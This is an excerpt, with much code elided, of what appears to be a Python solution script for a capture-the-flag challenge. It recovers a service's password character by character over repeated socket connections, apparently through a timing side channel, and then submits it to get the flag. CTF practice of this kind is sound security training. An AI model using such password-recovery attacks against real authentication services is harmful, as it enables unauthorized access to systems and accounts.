...
# this solution is designed to be run in parralel for efficiency
HOST = "31.97.106.219"
HOST = "localhost"
PORT = 1227
TIMEOUT = 2.0
...
DENIED_RESPONSE = "Access Denied. Please try again..."
...
def read_remaining_response(sock):
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
...
def submit_guess(guess):
    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
        ...
        response += read_remaining_response(sock)
    ...
    for _ in range(sample_count):
        try:
            with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
                ...
                response = sock.recv(4096)
                if b"Access Granted" in response or b"PrisonCTF{" in response:
                    sock.settimeout(DRAIN_TIMEOUT)
                    response += read_remaining_response(sock)
...
def recover_password():
    ...
    for _ in range(MAX_PASSWORD_LENGTH):
        ...
        response_text = submit_guess(recovered)
        if DENIED_RESPONSE not in response_text:
            return recovered, response_text.strip()
...
def main():
    ...
    print(f"Recovered password: {password}")
    if password:
        print(submit_guess(password).strip())
